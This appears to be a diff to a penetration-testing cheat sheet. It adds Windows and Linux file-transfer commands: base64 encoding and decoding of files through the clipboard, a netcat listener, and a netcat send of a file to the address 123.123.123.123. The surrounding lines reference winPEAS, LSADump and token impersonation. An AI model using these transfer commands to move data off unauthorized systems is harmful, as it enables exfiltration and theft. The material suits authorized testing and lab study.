@@ -96,6 +96,13 @@ Wrap in `powershell -c "Invoke-Web..."` if needed
 	./winpeas.exe > winpeas-output.txt
 Run the script and save results  
 
+## Windows - file transfer
+	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
+Convert file into clipboard contents  
+
+	[IO.File]::WriteAllBytes("C:\filename", [Convert]::FromBase64String("base64string"))
+Write clipboard into file  
+
 ## Windows - directory
 	tree /f
 .  
@@ -160,6 +167,19 @@ LSADump
 
 ## Windows - impersonate token
 	https://www.offsec.com/metasploit-unleashed/fun-incognito/
+
+## Linux - file transfer
+	cat filename | base64 -w 0;echo
+Convert file into clipboard contents  
+
+	echo -n 'base64code' | base64 -d > filename
+Save clipboard into file
+
+	nc -l -p 8000 --recv-only > filename
+Save nc contents on port 8000 into filename  
+
+	nc --send-only 123.123.123.123 8000 < filename
+Send filename contents into target port 8000 over nc
 
 ## Linux - directory
 	tree
